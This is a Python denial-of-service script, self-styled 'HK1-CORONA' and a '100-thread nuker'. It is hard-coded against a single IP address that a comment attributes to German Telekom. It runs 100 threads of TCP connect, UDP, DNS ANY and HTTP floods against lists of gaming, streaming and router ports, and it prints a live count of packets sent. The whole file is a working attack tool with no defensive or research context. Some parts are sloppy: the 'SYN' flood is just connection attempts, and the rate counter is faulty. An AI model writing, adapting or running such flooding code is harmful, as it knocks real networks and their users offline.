import socket
import threading
import time
import random
import struct

target_ip = "62.109.121.42"  # German Telekom IP
GAMING_PORTS = [3074, 3478, 3479, 3480, 27014, 27015, 27016, 27017, 27018, 25565, 3724, 6112, 2302, 2303, 2304, 2305, 6667, 27960, 28960, 29900]
STREAMING_PORTS = [80, 443, 1935, 554, 8554, 8080, 8443]
ROUTER_PORTS = [53, 67, 68, 161, 162, 23, 22, 21, 69, 123, 137, 138, 139, 445, 1900, 2869, 5353, 7547, 8081, 8444]

RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
MAGENTA = '\033[95m'
RESET = '\033[0m'

# MASSIVE ATTACK PAYLOADS
def create_syn_bomb():
    return b''

def create_udp_bomb():
    return random.randbytes(1472)  # Max UDP before fragmentation

def create_dns_bomb():
    # DNS ANY query for huge response
    domain = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=12)) + '.com'
    query = struct.pack('>HHHHHH', random.randint(1, 65535), 0x0100, 1, 0, 0, 0)
    query += b''.join(struct.pack('B', len(part)) + part.encode() for part in domain.split('.'))[:-1]
    query += b'\x00\x00\xff\x00\x01'  # ANY query
    return query

def create_http_bomb():
    return b'GET / HTTP/1.1\r\nHost: ' + target_ip.encode() + b'\r\nX-Forwarded-For: ' + b','.join([b'1.1.1.' + str(i).encode() for i in range(100)]) + b'\r\n\r\n'

def create_icmp_bomb():
    return b'\x08\x00\xf7\xff' + b'\x00' * 1472

# Stats
stats = {"packets": 0, "data": 0, "threads": 0}
lock = threading.Lock()
running = True

# MASSIVE ATTACK THREADS (1000+ PPS)
def mega_attack_thread(thread_id):
    global running
    packet_count = 0
    data_count = 0
    
    while running:
        try:
            attack_type = random.randint(1, 4)
            port = random.choice(GAMING_PORTS + STREAMING_PORTS + ROUTER_PORTS)
            
            if attack_type == 1:  # SYN flood
                for _ in range(50):
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.001)
                    sock.connect_ex((target_ip, port))
                    sock.close()
                    packet_count += 1
                    data_count += 64
            
            elif attack_type == 2:  # UDP flood
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                payload = create_udp_bomb()
                for _ in range(50):
                    sock.sendto(payload, (target_ip, port))
                    packet_count += 1
                    data_count += len(payload)
                sock.close()
            
            elif attack_type == 3:  # DNS flood
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                payload = create_dns_bomb()
                for _ in range(50):
                    sock.sendto(payload, (target_ip, 53))
                    packet_count += 1
                    data_count += len(payload)
                sock.close()
            
            elif attack_type == 4:  # HTTP flood
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.001)
                sock.connect_ex((target_ip, 80))
                payload = create_http_bomb()
                sock.send(payload)
                sock.close()
                packet_count += 1
                data_count += len(payload)
            
            # Update stats every 100 packets
            if packet_count >= 100:
                with lock:
                    stats["packets"] += packet_count
                    stats["data"] += data_count
                packet_count = 0
                data_count = 0
            
        except:
            pass
        
        # No sleep = MAXIMUM PPS

# Start 100 ATTACK THREADS
print(f"{RED}STARTING 100-THREAD NUKER{RESET}")
print(f"{YELLOW}Target: {target_ip} (German Telekom){RESET}")
print(f"{MAGENTA}Gaming Ports: {len(GAMING_PORTS)} | Streaming: {len(STREAMING_PORTS)} | Router: {len(ROUTER_PORTS)}{RESET}")
print(f"{RED}Expected: 10,000+ PPS{RESET}")
print()

for i in range(100):
    threading.Thread(target=mega_attack_thread, args=(i,), daemon=True).start()
    stats["threads"] += 1
    if i % 20 == 0:
        print(f"{GREEN}Started {i+1}/100 attack threads{RESET}")

# MONITOR
last_packets = 0
last_time = time.time()
max_pps = 0

print(f"\n{CYAN}HK1-CORONA FULL POWER{RESET}")
print(f"{RED}ATTACKING: {target_ip}{RESET}")
print()

try:
    while True:
        time.sleep(5)
        
        with lock:
            current_packets = stats["packets"]
            current_data = stats["data"]
            stats["packets"] = 0
            stats["data"] = 0
        
        current_time = time.time()
        time_diff = current_time - last_time
        pps = int((current_packets - last_packets) / time_diff) if time_diff > 0 else 0
        
        if pps > max_pps:
            max_pps = pps
        
        data_mb = current_data / (1024 * 1024)
        
        # COLOR BASED ON POWER
        if pps < 1000:
            pps_color = RED
        elif pps < 5000:
            pps_color = YELLOW
        else:
            pps_color = GREEN
        
        print(f"HK1:{pps_color}{pps:,}{RESET}:{GREEN}{data_mb:.2f}MB{RESET}")
        print(f"{CYAN}Threads: {stats['threads']} | Max PPS: {max_pps:,}{RESET}")
        print(f"{MAGENTA}Target Status: {RED}HEAVY LOAD{RESET if pps > 3000 else YELLOW if pps > 1000 else RED}")
        print()
        
        last_packets = current_packets
        last_time = current_time
        
except KeyboardInterrupt:
    running = False
    print(f"\n{RED}ATTACK STOPPED{RESET}")
    print(f"{YELLOW}Final Max PPS: {max_pps:,}{RESET}")
    print(f"{CYAN}Total attack threads: {stats['threads']}{RESET}")
